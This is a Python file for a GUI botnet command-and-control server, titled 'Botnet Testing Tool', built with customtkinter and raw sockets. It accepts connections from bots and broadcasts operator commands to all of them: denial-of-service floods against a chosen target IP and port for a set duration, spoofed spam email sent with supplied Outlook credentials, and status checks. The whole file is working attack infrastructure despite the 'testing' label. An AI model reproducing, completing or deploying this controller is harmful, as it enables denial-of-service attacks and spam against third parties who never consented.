import sys
import customtkinter as ctk
from tkinter import *
from socket import AF_INET, socket, SOCK_STREAM, SHUT_RDWR
from threading import Thread, Event 
import netifaces as ni

clients = {}
addresses = {}

class App(ctk.CTk):
    def __init__(self):
        super().__init__()

        self.title("Botnet Testing Tool")
        self.geometry('700x500')

        self.create_widgets()
        self.protocol("WM_DELETE_WINDOW", self.on_closing)
        # create an instance of threading.Event()
        self.stop_event = Event() 

    
    def on_closing(self):
        # set the threading event to stop the accept_incoming_connections() function
        self.stop_event.set() 
        
        if SERVER:
            # close all connected clients
            for sock in clients:
                sock.close()
            
            # close server socket
            try:
                SERVER.shutdown(SHUT_RDWR)
                SERVER.close()
            except OSError as e:
                print("Error occurred while shutting down server:", e)

        self.destroy()

    def create_widgets(self):
        # Init Frames
        self.command_frame = Command_Frame(self)
        self.command_details_frame = Command_Details_Frame(self)

        #  Start Server button
        self.start_server_btn = ctk.CTkButton(
            master=self, 
            text="Start Server", 
            command= lambda: self.start_server()
        )
        self.start_server_btn.pack(padx=20, pady=5)

        # Server status label
        self.server_status_var = ctk.StringVar(value="Server is not running")
        self.server_status_label = ctk.CTkLabel(master=self, text="status", textvariable=self.server_status_var)
        self.server_status_label.pack(padx=20, pady=2)

        # Add Frames last
        self.command_frame.pack(padx=25, pady=25, expand=True, side="left")
        self.command_details_frame.pack(padx=15, pady=15, expand=True, side="right")

    def start_server(self):
        print("Waiting for connection...")
        self.server_status_var.set("Waiting for connection...")
        self.start_server_btn.configure(state="disabled")
        self.ACCEPT_THREAD = Thread(target=self.accept_incoming_connections, args=(self.stop_event,)) # pass the threading event as a parameter
        self.ACCEPT_THREAD.start()

    def accept_incoming_connections(self, stop_event):
        try:
            # use the threading event to stop the loop
            while not stop_event.is_set():
                client,client_address = SERVER.accept()
                self.command_frame.cmd_option_menu.configure(state="normal")
                addresses[client] = client_address 
                HANDLING_THREAD = Thread(target=self.handle_client, args=(client, stop_event,))
                HANDLING_THREAD.start()
        except OSError:
                print()

    def handle_client(self, client, stop_event):
        name = f"Bot {len(addresses)}@{addresses[client]}"
        print(f"{name} has joined the chat") 
        clients[client] = name
        self.server_status_var.set(f"{len(clients)} connection(s).")

        while not stop_event.is_set():
            msg = client.recv(BUFSIZ)
            if msg != bytes("{quit}", "utf8"):
                msg = msg.decode("utf8")
                print(msg)
                self.command_details_frame.command_details_var.set(msg)
            else:
                client.close()
                del clients[client]
                print(f"{addresses[client]} has left the chat.")
                self.server_status_var.set(f"{len(clients)} connection(s).")
                break

class Command_Details_Frame(ctk.CTkFrame):
    def __init__(self, parent):
        super().__init__(parent)
        self.parent = parent
        self.create_widgets()

    def create_widgets (self):
        # Command Details Pair
        self.cmd_output_label = ctk.CTkLabel(master=self, text="Command Details:")
        self.cmd_output_label.grid(row=0, column=0,padx=5, sticky="s")

        self.command_details_var = ctk.StringVar()
        self.cmd_details = ctk.CTkLabel(
            master=self, 
            textvariable=self.
            command_details_var, 
            width=260, 
            height=275,
            fg_color="#3D3D3D",
            corner_radius=8
        ) 
        self.cmd_details.grid(row=1, column=0, rowspan=5, padx=10, pady=10, sticky="nsew")

class Command_Frame(ctk.CTkFrame):
    def __init__(self, parent):
        super().__init__(parent)
        self.parent = parent
        self.create_widgets()
    
    def create_widgets(self):        
        # Command Frames
        self.dos_frame = Dos_Cmd(self)
        self.spam_frame = Spam_Cmd(self)
        self.status_frame = Status_Cmd(self)

        # Command Type label
        self.cmd_type_label = ctk.CTkLabel(master=self, text="Command:")
        self.cmd_type_label.grid(row=0, column=0, columnspan=2, padx=5, sticky="s")

        # Command Type Dropdown
        self.cmd_option_var = ctk.StringVar()
        self.cmd_options = ["DoS","Spam Email","Status"]
        self.cmd_option_menu = ctk.CTkOptionMenu(
            master=self, 
            values=self.cmd_options, 
            variable=self.cmd_option_var, 
            state="disabled",
            command=lambda cmd_type=self.cmd_option_var.get(): self.create_cmd_frame(cmd_type)
        )
        self.cmd_option_menu.grid(row=1, column=0, columnspan=2, padx=5, pady=5, sticky="n")

    def create_cmd_frame(self, cmd_type): 
        self.hide_cmd_frames()
        match cmd_type:
            case "DoS":
                self.dos_frame.grid(row=2, column=0, rowspan=3, columnspan=2, padx=15, pady=15)

            case "Spam Email":
                self.spam_frame.grid(row=2, column=0, rowspan=3, columnspan=2, padx=15, pady=15)

            case "Status":
                self.status_frame.grid(row=2, column=0, rowspan=3, columnspan=2, padx=15, pady=15)
                pass
            
            case _:
                pass

        return
    
    def hide_cmd_frames(self):
        self.dos_frame.grid_forget()
        self.spam_frame.grid_forget()
        self.status_frame.grid_forget()

class Dos_Cmd(ctk.CTkFrame):
    def __init__(self, parent):
        super().__init__(parent)
        self.create_widgets()

    def create_widgets(self):
        self.rowconfigure(0, weight=1)
        self.rowconfigure(1, weight=2)
        self.rowconfigure(2, weight=1)
        self.rowconfigure(3, weight=2)

        self.dos_target_ip = ctk.StringVar()
        self.dos_source_port = ctk.StringVar()
        self.dos_max_dur = ctk.StringVar()

        self.target_ip_label = ctk.CTkLabel(master=self, text="Target's IP")
        self.source_port_label = ctk.CTkLabel(master=self, text="Source Port")
        self.max_dur_label = ctk.CTkLabel(master=self, text="Max duration in seconds")

        self.target_ip_label.grid(row=0, column=0, padx=5, sticky="s")
        self.source_port_label.grid(row=0, column=1, padx=5, sticky="s")
        self.max_dur_label.grid(row=2, column=0, padx=5, sticky="s")

        self.target_ip_entry = ctk.CTkEntry(master=self, textvariable=self.dos_target_ip)
        self.source_port_entry = ctk.CTkEntry(master=self, textvariable=self.dos_source_port)
        self.max_dur_entry = ctk.CTkEntry(master=self, textvariable=self.dos_max_dur)

        self.target_ip_entry.grid(row=1, column=0, padx=5, pady=5)
        self.source_port_entry.grid(row=1, column=1, padx=5, pady=5)
        self.max_dur_entry.grid(row=3, column=0, padx=5, pady=5)

        # Execute Button
        self.command_execute_btn = ctk.CTkButton(
            master=self, 
            text="Execute", 
            command= self.execute_dos
        )
        self.command_execute_btn.grid(row=4, column=0,columnspan=2, padx=5, pady=5)

    def execute_dos(self):
        print(f"Executing DoS command")
        target_ip_val = self.dos_target_ip.get()
        source_port_val = self.dos_source_port.get()
        max_dur_val = self.dos_max_dur.get()

        msg = f"command=dos, target_ip={target_ip_val}, source_port={source_port_val}, max_duration={max_dur_val}"
        
        for sock in clients:
            sock.send(bytes(msg, "utf8"))

        self.target_ip_entry.delete(0,END)
        self.source_port_entry.delete(0,END)
        self.max_dur_entry.delete(0,END) 

class Spam_Cmd(ctk.CTkFrame):
    def __init__(self, parent):
        super().__init__(parent)
        self.create_widgets()

    def create_widgets(self):
        self.spam_username = ctk.StringVar()
        self.spam_password = ctk.StringVar()
        self.spam_to_email = ctk.StringVar()

        self.username_label = ctk.CTkLabel(master=self, text="Outlook Email")
        self.password_label = ctk.CTkLabel(master=self, text="Email's Password")
        self.to_email_label = ctk.CTkLabel(master=self, text="To email")

        self.username_entry = ctk.CTkEntry(master=self, textvariable=self.spam_username)
        self.password_entry = ctk.CTkEntry(master=self, textvariable=self.spam_password)
        self.to_email_entry = ctk.CTkEntry(master=self, textvariable=self.spam_to_email)

        self.username_label.grid(row=0, column=0, padx=5, sticky="s")
        self.password_label.grid(row=0, column=1, padx=5, sticky="s")
        self.to_email_label.grid(row=2, column=0, padx=5, sticky="s")

        self.username_entry.grid(row=1, column=0, padx=5, pady=5)
        self.password_entry.grid(row=1, column=1, padx=5, pady=5)
        self.to_email_entry.grid(row=3, column=0, padx=5, pady=5)

        # Execute Button
        self.command_execute_btn = ctk.CTkButton(
            master=self, 
            text="Execute", 
            command= self.execute_spam
        )
        self.command_execute_btn.grid(row=4, column=0,columnspan=2, padx=5, pady=5)

    def execute_spam(self):
        username = self.spam_username.get()
        password = self.spam_password.get()
        to_email = self.spam_to_email.get()

        msg = f"command=email_spoof, username={username}, password={password}, to_email={to_email}"
        
        for sock in clients:
            sock.send(bytes(msg, "utf8"))

        self.username_entry.delete(0, END)
        self.password_entry.delete(0, END)
        self.to_email_entry.delete(0, END)

class Status_Cmd(ctk.CTkFrame):
    def __init__(self, parent):
        super().__init__(parent)
        self.create_widgets()

    def create_widgets(self):
        self.command_execute_btn = ctk.CTkButton(
            master=self, 
            text="Execute", 
            command= self.execute_status
        )
        self.command_execute_btn.grid(row=0, column=0,columnspan=2, padx=25, pady=25)

    def execute_status(self): 
        msg = "command=status"
        for sock in clients:
            sock.send(bytes(msg, "utf8"))

if __name__ == "__main__":
    # C&C's IP address
    HOST = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr'] 
    PORT = int(sys.argv[1])
    BUFSIZ = 1024
    ADDR = (HOST, PORT)

    SERVER = socket(AF_INET, SOCK_STREAM)
    SERVER.bind(ADDR)
    SERVER.listen(5)
    app = App() 
    app.mainloop() 